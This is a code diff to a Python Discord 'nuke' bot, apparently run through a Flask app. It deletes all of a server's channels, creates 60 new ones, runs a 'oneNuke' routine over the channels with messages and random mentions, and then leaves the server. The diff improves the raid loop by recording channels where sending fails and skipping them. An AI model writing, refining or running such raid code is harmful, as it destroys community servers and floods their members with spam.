@@ -8,6 +8,7 @@ app = Flask(__name__)
 logs = {}
 logIdBotClass = {}
 stops = []
+failedChannels = []
 discordApiBaseUrl = "https://discord.com/api/v9"
 
 class DiscordApis():
@@ -63,9 +64,11 @@ class DiscordBot(discord.Client):
             logs[self.logId] += "[-]Failed"
         logs[self.logId] += f" - {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
     async def sendMessage(self, message:str, channel:discord.abc.GuildChannel, latencyMs:float):
+        if channel in failedChannels:
+            return
         if channel in self.guild.categories:
             try:
-                self.channels.remove(channel)
+                failedChannels.append(channel)
             except:
                 pass
             return
@@ -75,7 +78,7 @@ class DiscordBot(discord.Client):
         except Exception as e:
             logs[self.logId] += f"[-]Failed {e}"
             try:
-                self.channels.remove(channel)
+                failedChannels.append(channel)
             except:
                 pass
         logs[self.logId] += f" - {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
@@ -146,7 +149,7 @@ class DiscordBot(discord.Client):
             if self.allChannelDelete:
                 await self.deleteAllChannel(self.guild)
                 await asyncio.gather(*(self.createChannel(self.channelName, self.guild) for _ in range(60)))
-            channels = list(self.guild.channels)
+            self.channels = list(self.guild.channels)
             roles = list(self.guild.roles)
             members = self.guild.members
             # exclusion everyone
@@ -157,12 +160,12 @@ class DiscordBot(discord.Client):
                     return
                 logs[self.logId] += f"--- Nuke ID:{self.user.id} ---\n"
                 if not self.channelId:
-                    random.shuffle(channels)
-                    for channel in channels:
+                    random.shuffle(self.channels)
+                    for channel in self.channels:
                         if str(channel.id) in self.exclusionChannelIds:
                             continue
                         await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
-                        random.shuffle(channels)
+                        random.shuffle(self.channels)
                 else:
                     await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
             await self.guild.leave()
